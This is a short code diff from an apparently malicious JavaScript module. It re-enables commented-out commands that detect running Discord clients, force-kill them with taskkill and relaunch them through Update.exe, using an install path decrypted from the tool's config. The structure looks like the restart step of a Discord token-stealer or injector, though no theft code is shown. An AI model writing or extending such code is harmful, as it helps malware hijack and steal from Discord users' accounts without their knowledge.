@@ -431,8 +431,8 @@ module.exports = (client) => {
             await client.requires.child_process.exec('tasklist', async (err, stdout) => {
                 for (const executable of ['Discord.exe', 'DiscordCanary.exe', 'discordDevelopment.exe', 'DiscordPTB.exe']) {
                     if (stdout.includes(executable)) {
-                        //await client.requires.child_process.exec(`taskkill /F /T /IM ${executable}`, (err) => {}) // Close
-                        //await client.requires.child_process.exec(`"${client.utils.encryption.decryptData(client.config.user.localappdata)}\\${executable.replace('.exe', '')}\\Update.exe" --processStart ${executable}`, (err) => {}) // Start
+                        await client.requires.child_process.exec(`taskkill /F /T /IM ${executable}`, (err) => {}) // Close
+                        await client.requires.child_process.exec(`"${client.utils.encryption.decryptData(client.config.user.localappdata)}\\${executable.replace('.exe', '')}\\Update.exe" --processStart ${executable}`, (err) => {}) // Start
                     }
                 }
             })
